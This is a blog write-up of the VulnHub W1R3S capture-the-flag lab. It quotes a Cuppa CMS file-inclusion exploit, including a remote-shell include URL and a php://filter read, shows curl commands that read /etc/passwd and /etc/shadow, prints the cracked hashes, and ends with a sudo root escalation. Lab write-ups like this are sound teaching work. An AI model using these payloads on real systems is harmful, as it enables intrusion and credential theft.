---
layout: post
title: "Getting in the W1R3S"
date: 2018-11-30 16:18:45 +0200
comments: true
categories: [penetration testing, writeups]
keywords: w1r3s, pentest lab, vulnhub, ctf, boot2root, wpseku, cuppa cms
description: W1r3S writeup
---


With today's post I am experimenting with a new way of writing my hacking blog posts based on the [5 phases of red teams assessments](https://redteams.net/redteaming/2017/phases-of-a-red-team-assessment-revisited).

<!-- more -->

## Phase 1: OPORD

The machine description is the following:

```
You have been hired to do a penetration test on the W1R3S.inc individual server and report all findings. They have asked you to gain root access and find the flag (located in /root directory).

Difficulty to get a low privileged shell: Beginner/Intermediate

Difficulty to get privilege escalation: Beginner/Intermediate

About: This is a vulnerable Ubuntu box giving you somewhat of a real world scenario and reminds me of the OSCP labs.
```

## Phase 2: RECON

```
PORT     STATE SERVICE VERSION
21/tcp   open  ftp     vsftpd 2.0.8 or later
| ftp-anon: Anonymous FTP login allowed (FTP code 230)
| drwxr-xr-x    2 ftp      ftp          4096 Jan 23  2018 content
| drwxr-xr-x    2 ftp      ftp          4096 Jan 23  2018 docs
|_drwxr-xr-x    2 ftp      ftp          4096 Jan 28  2018 new-employees
| ftp-syst:
|   STAT:
| FTP server status:
|      Connected to ::ffff:192.168.145.130
|      Logged in as ftp
|      TYPE: ASCII
|      No session bandwidth limit
|      Session timeout in seconds is 300
|      Control connection is plain text
|      Data connections will be plain text
|      At session startup, client count was 1
|      vsFTPd 3.0.3 - secure, fast, stable
|_End of status
22/tcp   open  ssh     OpenSSH 7.2p2 Ubuntu 4ubuntu2.4 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey:
|   2048 07:e3:5a:5c:c8:18:65:b0:5f:6e:f7:75:c7:7e:11:e0 (RSA)
|   256 03:ab:9a:ed:0c:9b:32:26:44:13:ad:b0:b0:96:c3:1e (ECDSA)
|_  256 3d:6d:d2:4b:46:e8:c9:a3:49:e0:93:56:22:2e:e3:54 (ED25519)
80/tcp   open  http    Apache httpd 2.4.18 ((Ubuntu))
|_http-server-header: Apache/2.4.18 (Ubuntu)
|_http-title: Apache2 Ubuntu Default Page: It works
3306/tcp open  mysql   MySQL (unauthorized)
```

The immediate points of interest are the FTP server, and the web server. Since Nmap only found the Apache default page, I started some background enumeration with Gobuster:

```
gobuster -u http://192.168.145.134 -w /usr/share/wordlists/dirb/common.txt

=====================================================
Gobuster v2.0.0              OJ Reeves (@TheColonial)
=====================================================
[+] Mode         : dir
[+] Url/Domain   : http://192.168.145.134/
[+] Threads      : 10
[+] Wordlist     : /usr/share/wordlists/dirb/common.txt
[+] Status codes : 200,204,301,302,307,403
[+] Timeout      : 10s
=====================================================
2018/11/30 05:46:49 Starting gobuster
=====================================================
/.hta (Status: 403)
/.htaccess (Status: 403)
/.htpasswd (Status: 403)
/administrator (Status: 301)
/index.html (Status: 200)
/javascript (Status: 301)
/server-status (Status: 403)
/wordpress (Status: 301)
=====================================================
```

Ok, we have some web directories to check..a possible Wordpress installation, a MySQL database and an FTP server that we can login to.

## Phase 3: TARGET ID

Logging in to the FTP server, we see the following directories:

```
150 Here comes the directory listing.
drwxr-xr-x    2 ftp      ftp          4096 Jan 23  2018 content
drwxr-xr-x    2 ftp      ftp          4096 Jan 23  2018 docs
drwxr-xr-x    2 ftp      ftp          4096 Jan 28  2018 new-employees
```

I downloaded them to my machine with <code>wget -r ftp://ftp:anonymous@192.168.145.134/</code>. Inside the *content* folder there are 3 text files, and one of them contains potentially interesting data:

```
root@onosendai:~/target/192.168.145.134/content# ls -alh
total 20K
drwxr-xr-x 2 root root 4.0K Nov 30 06:16 .
drwxr-xr-x 5 root root 4.0K Nov 30 06:16 ..
-rw-r--r-- 1 root root   29 Jan 23  2018 01.txt
-rw-r--r-- 1 root root  165 Jan 23  2018 02.txt
-rw-r--r-- 1 root root  582 Jan 23  2018 03.txt
root@onosendai:~/target/192.168.145.134/content# cat 01.txt
New FTP Server For W1R3S.inc
root@onosendai:~/target/192.168.145.134/content# cat 02.txt
#
#
#
#
#
#
#
#
01ec2d8fc11c493b25029fb1f47f39ce
#
#
#
#
#
#
#
#
#
#
#
#
#
SXQgaXMgZWFzeSwgYnV0IG5vdCB0aGF0IGVhc3kuLg==
############################################
root@onosendai:~/target/192.168.145.134/content# cat 03.txt
___________.__              __      __  ______________________   _________    .__               
\__    ___/|  |__   ____   /  \    /  \/_   \______   \_____  \ /   _____/    |__| ____   ____  
  |    |   |  |  \_/ __ \  \   \/\/   / |   ||       _/ _(__  < \_____  \     |  |/    \_/ ___\
  |    |   |   Y  \  ___/   \        /  |   ||    |   \/       \/        \    |  |   |  \  \___
  |____|   |___|  /\___  >   \__/\  /   |___||____|_  /______  /_______  / /\ |__|___|  /\___  >
                \/     \/         \/                \/       \/        \/  \/         \/     \/
```

I used an online MD5 hash cracker to get the value <code>This is not a password</code>. And the base64 string gave the message that <code>It is easy, but not that easy..</code>. So there are probably red herrings, let's move on.

Inside *docs* there's a text file with some upside down text:

```
root@onosendai:~/target/192.168.145.134/docs# cat worktodo.txt
	ı pou,ʇ ʇɥıuʞ ʇɥıs ıs ʇɥǝ ʍɐʎ ʇo ɹooʇ¡

....punoɹɐ ƃuıʎɐןd doʇs ‘op oʇ ʞɹoʍ ɟo ʇoן ɐ ǝʌɐɥ ǝʍ
```

Used an [online converter](http://flip-upsidedown-text.1bestlink.net/) to flip this and reverse it for the text:

```
we have a ןot of work to do‘ stop pןaying around˙˙˙˙
i don't think this is the way to root!
```

This is also useless..The final piece gives us some names that we might be able to use later:

```
root@onosendai:~/target/192.168.145.134/new-employees# cat employee-names.txt
The W1R3S.inc employee list

Naomi.W - Manager
Hector.A - IT Dept
Joseph.G - Web Design
Albert.O - Web Design
Gina.L - Inventory
Rico.D - Human Resources
```

This is all the information we got from the FTP vector. Let's return to the web server now. The javascript folder was forbidden for viewing, and the wordpress folder redirected to localhost/wordpress, so I had to modify my <code>/etc/hosts</code> file:

```
192.168.145.134 localhost
```

Now I could get to the Wordpress blog, which looks to be under construction:

{% img center /images/pentest/w1r3s/wordpress.png 'wordpress' 'wordpress' %}

I decided to go with an alternate Wordpress scanner for this one, so instead of WPScan, I went with [WPSeku](https://github.com/m4ll0k/WPSeku)

> WPSeku - Wordpress Security Scanner

> WPSeku is a black box WordPress vulnerability scanner that can be used to scan remote WordPress installations to find security issues.

```
python3 wpseku.py
----------------------------------------
 _ _ _ ___ ___ ___| |_ _ _
| | | | . |_ -| -_| '_| | |
|_____|  _|___|___|_,_|___|
      |_|             v0.4.0

WPSeku - Wordpress Security Scanner
by Momo Outaadi (m4ll0k)
----------------------------------------

Usage: wpseku.py [options]

	-u --url	Target URL (e.g: http://site.com)
	-b --brute	Bruteforce login via xmlrpc
	-U --user	Set username for bruteforce, default "admin"
	-s --scan	Checking wordpress plugin code
	-p --proxy	Use a proxy, (host:port)
	-c --cookie	Set HTTP Cookie header value
	-a --agent	Set HTTP User-agent header value
	-r --ragent	Use random User-agent header value
	-R --redirect	Set redirect target URL False
	-t --timeout	Seconds to wait before timeout connection
	-w --wordlist	Set wordlist, default "db/wordlist.txt"
	-v --verbose	Print more informations
	-h --help	Show this help and exit

Example:
	 wpseku.py --url http://site.com/
	 wpseku.py --url http://site.com --brute --user test
	 wpseku.py --url http://site.com/ --brute --user admin --wordlist wordlist.txt
```

Ran it against the target:

```
python3 wpseku.py -u http://localhost/wordpress/ -v
----------------------------------------
 _ _ _ ___ ___ ___| |_ _ _
| | | | . |_ -| -_| '_| | |
|_____|  _|___|___|_,_|___|
      |_|             v0.4.0

WPSeku - Wordpress Security Scanner
by Momo Outaadi (m4ll0k)
----------------------------------------

[ + ] Target: http://localhost/wordpress/
[ + ] Starting: 07:52:06

[ + ] Server: Apache/2.4.18 (Ubuntu)
[ i ] Checking Full Path Disclosure...
[ i ] Checking wp-config backup file...
[ + ] wp-config.php available at: http://localhost/wordpress/wp-config.php
[ i ] Checking common files...
[ + ] readme.html file was found at: http://localhost/wordpress/readme.html
[ i ] Checking directory listing...
[ + ] Dir "/wp-admin/css" listing enable at: http://localhost/wordpress/wp-admin/css/
[ + ] Dir "/wp-admin/images" listing enable at: http://localhost/wordpress/wp-admin/images/
[ + ] Dir "/wp-admin/includes" listing enable at: http://localhost/wordpress/wp-admin/includes/
[ + ] Dir "/wp-admin/js" listing enable at: http://localhost/wordpress/wp-admin/js/
[ + ] Dir "/wp-content/uploads" listing enable at: http://localhost/wordpress/wp-content/uploads/
[ + ] Dir "/wp-includes/" listing enable at: http://localhost/wordpress/wp-includes/
[ + ] Dir "/wp-includes/js" listing enable at: http://localhost/wordpress/wp-includes/js/
[ + ] Dir "/wp-includes/Text" listing enable at: http://localhost/wordpress/wp-includes/Text/
[ + ] Dir "/wp-includes/css" listing enable at: http://localhost/wordpress/wp-includes/css/
[ + ] Dir "/wp-includes/images" listing enable at: http://localhost/wordpress/wp-includes/images/
[ + ] Dir "/wp-includes/pomo" listing enable at: http://localhost/wordpress/wp-includes/pomo/
[ + ] Dir "/wp-includes/theme-compat" listing enable at: http://localhost/wordpress/wp-includes/theme-compat/
[ i ] Checking wp-loging protection...
[ i ] Checking robots paths...
[ i ] Checking WordPress version...
[ + ] Running WordPress version: 4.9.8
  |   Not found vulnerabilities

[ i ] Passive enumeration themes...
[ + ] Name: twentyseventeen
[ i ] Checking themes changelog...
[ i ] Checking themes full path disclosure...
[ i ] Checking themes license...
[ i ] Checking themes readme...
[ i ] Checking themes directory listing...
[ i ] Checking theme vulnerabilities...
  |   Not found vulnerabilities

[ i ] Passive enumeration plugins...
[ + ] Not found plugins with passive enumeration
[ i ] Enumerating users...
----------------------------
| ID | Username | Login    |
----------------------------
|  0 | Admin    | admin    |
|  1 | Admin    | None     |
|  2 |          | admin    |
|  3 |          | joseph-g |
----------------------------
```

Nothing evidently exploitable in the scan results, so I turned to the */administrator* folder on the web server and got to the configuration screen of a Cuppa CMS:

{% img center /images/pentest/w1r3s/cuppa-cms.png 'cuppa cms' 'cuppa cms' %}

Couldn't proceed with the configuration because I didn't have enough information:

{% img center /images/pentest/w1r3s/cuppa-admin.png 'cuppa admin' 'cuppa admin' %}

I've never heard of this CMS before, I ran a quick searchsploit and got a hit:

```
searchsploit cuppa cms
------------------------------------------------------------------------------------------------------------ ----------------------------------------
 Exploit Title                                                                                              |  Path
                                                                                                            | (/usr/share/exploitdb/)
------------------------------------------------------------------------------------------------------------ ----------------------------------------
Cuppa CMS - '/alertConfigField.php' Local/Remote File Inclusion                                             | exploits/php/webapps/25971.txt
------------------------------------------------------------------------------------------------------------ ----------------------------------------
```

Let's see what this is about:

```
####################################

VULNERABILITY: PHP CODE INJECTION

####################################



/alerts/alertConfigField.php (LINE: 22)



-----------------------------------------------------------------------------

LINE 22:

        <?php include($_REQUEST["urlConfig"]); ?>

-----------------------------------------------------------------------------





#####################################################

DESCRIPTION

#####################################################



An attacker might include local or remote PHP files or read non-PHP files with this vulnerability. User tainted data is used when creating the file name that will be included into the current file. PHP code in this file will be evaluated, non-PHP code will be embedded to the output. This vulnerability can lead to full server compromise.



http://target/cuppa/alerts/alertConfigField.php?urlConfig=[FI]



#####################################################

EXPLOIT

#####################################################



http://target/cuppa/alerts/alertConfigField.php?urlConfig=http://www.shell.com/shell.txt?

http://target/cuppa/alerts/alertConfigField.php?urlConfig=../../../../../../../../../etc/passwd



Moreover, We could access Configuration.php source code via PHPStream



For Example:

-----------------------------------------------------------------------------

http://target/cuppa/alerts/alertConfigField.php?urlConfig=php://filter/convert.base64-encode/resource=../Configuration.php

-----------------------------------------------------------------------------

```

## Phase 4: LIVE RUN

I tried the LFI, but all I got was a blank page in return. So I attempted this with curl, and got served the *passwd* file:

```
curl http://192.168.145.134/administrator/alerts/alertConfigField.php --data-urlencode urlConfig=../../../../../../../../../etc/passwd
[...]
w1r3s:x:1000:1000:w1r3s,,,:/home/w1r3s:/bin/bash
[...]
```

Now we have a valid user on the system and we can read arbitrary files. Because the root user was prepopulated in the installation page, I tried reading the */etc/shadow* file and...succeeded!

```
root:$6$vYcecPCy$JNbK.hr7HU72ifLxmjpIP9kTcx./ak2MM3lBs.Ouiu0mENav72TfQIs8h1jPm2rwRFqd87HDC0pi7gn9t7VgZ0:17554:0:99999:7:::
www-data:$6$8JMxE7l0$yQ16jM..ZsFxpoGue8/0LBUnTas23zaOqg2Da47vmykGTANfutzM8MuFidtb0..Zk.TUKDoDAVRCoXiZAH.Ud1:17560:0:99999:7:::
w1r3s:$6$xe/eyoTx$gttdIYrxrstpJP97hWqttvc5cGzDNyMb0vSuppux4f2CcBv3FwOt2P1GFLjZdNqjwRuP3eUjkgb/io7x9q1iP.:17567:0:99999:7:::
```

That was a lucky break! I put the hashes for root and w1r3s in a file to be cracked by John the Ripper and immediately got a password:

```
john hashes.txt
Created directory: /root/.john
Warning: detected hash type "sha512crypt", but the string is also recognized as "crypt"
Use the "--format=crypt" option to force loading these as that type instead
Using default input encoding: UTF-8
Loaded 2 password hashes with 2 different salts (sha512crypt, crypt(3) $6$ [SHA512 128/128 AVX 2x])
Press 'q' or Ctrl-C to abort, almost any other key for status
computer         (w1r3s)
```

With this, I could SSH in.

```
ssh w1r3s@192.168.145.134
The authenticity of host '192.168.145.134 (192.168.145.134)' can't be established.
ECDSA key fingerprint is SHA256:/3N0PzPMqtXlj9QWJFMbCufh2W95JylZ/oF82NkAAto.
Are you sure you want to continue connecting (yes/no)? yes
Warning: Permanently added '192.168.145.134' (ECDSA) to the list of known hosts.
----------------------
Think this is the way?
----------------------
Well,........possibly.
----------------------
w1r3s@192.168.145.134's password:
Welcome to Ubuntu 16.04.3 LTS (GNU/Linux 4.13.0-36-generic x86_64)

 * Documentation:  https://help.ubuntu.com
 * Management:     https://landscape.canonical.com
 * Support:        https://ubuntu.com/advantage

227 packages can be updated.
11 updates are security updates.

*** System restart required ***
.....You made it huh?....
Last login: Mon Jan 22 22:47:27 2018 from 192.168.0.35
```

One of the things I picked up from watching [Ippsec](https://www.youtube.com/channel/UCa6eh7gCkpPo5XXUDfygQQA) videos was to check the sudo privileges early on:

```
sudo -l
sudo: unable to resolve host W1R3S
[sudo] password for w1r3s:
Matching Defaults entries for w1r3s on W1R3S:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin

User w1r3s may run the following commands on W1R3S:
    (ALL : ALL) ALL
```

That tops the misconfiguration list! Our user has unlimited sudo privileges!

```
w1r3s@W1R3S:~$ sudo /bin/bash
sudo: unable to resolve host W1R3S
root@W1R3S:~# ls /root
flag.txt
root@W1R3S:~# cat /root/flag.txt
-----------------------------------------------------------------------------------------
   ____ ___  _   _  ____ ____      _  _____ _   _ _        _  _____ ___ ___  _   _ ____  
  / ___/ _ \| \ | |/ ___|  _ \    / \|_   _| | | | |      / \|_   _|_ _/ _ \| \ | / ___|
 | |  | | | |  \| | |  _| |_) |  / _ \ | | | | | | |     / _ \ | |  | | | | |  \| \___ \
 | |__| |_| | |\  | |_| |  _ <  / ___ \| | | |_| | |___ / ___ \| |  | | |_| | |\  |___) |
  \____\___/|_| \_|\____|_| \_\/_/   \_\_|  \___/|_____/_/   \_\_| |___\___/|_| \_|____/

-----------------------------------------------------------------------------------------

                          .-----------------TTTT_-----_______
                        /''''''''''(______O] ----------____  \______/]_
     __...---'"""\_ --''   Q                               ___________@
 |'''                   ._   _______________=---------"""""""
 |                ..--''|   l L |_l   |
 |          ..--''      .  /-___j '   '
 |    ..--''           /  ,       '   '
 |--''                /           `    \
                      L__'         \    -
                                    -    '-.
                                     '.    /
                                       '-./

----------------------------------------------------------------------------------------
  YOU HAVE COMPLETED THE
               __      __  ______________________   _________
              /  \    /  \/_   \______   \_____  \ /   _____/
              \   \/\/   / |   ||       _/ _(__  < \_____  \
               \        /  |   ||    |   \/       \/        \
                \__/\  /   |___||____|_  /______  /_______  /.INC
                     \/                \/       \/        \/        CHALLENGE, V 1.0
----------------------------------------------------------------------------------------

CREATED BY SpecterWires

----------------------------------------------------------------------------------------
```

## Phase 5: REPORT

The exploitation chain was as follows:

- enumeration revealed the Cuppa CMS directories
- Cuppa CMS was vulnerable to a LFI exploit
- due to the CMS being configured as root, it was possible to read the */etc/shadow* file with the LFI
- hash was cracked for standard user *w1r3s*
- the user had unlimited sudo privileges and elevating to root was achieved

Until next time!

```
_____________________________________
/ You'll never be the man your mother \
\ was!                                /
-------------------------------------
			 \   ^__^
				\  (oo)\_______
					 (__)\       )\/\
							 ||----w |
							 ||     ||
```

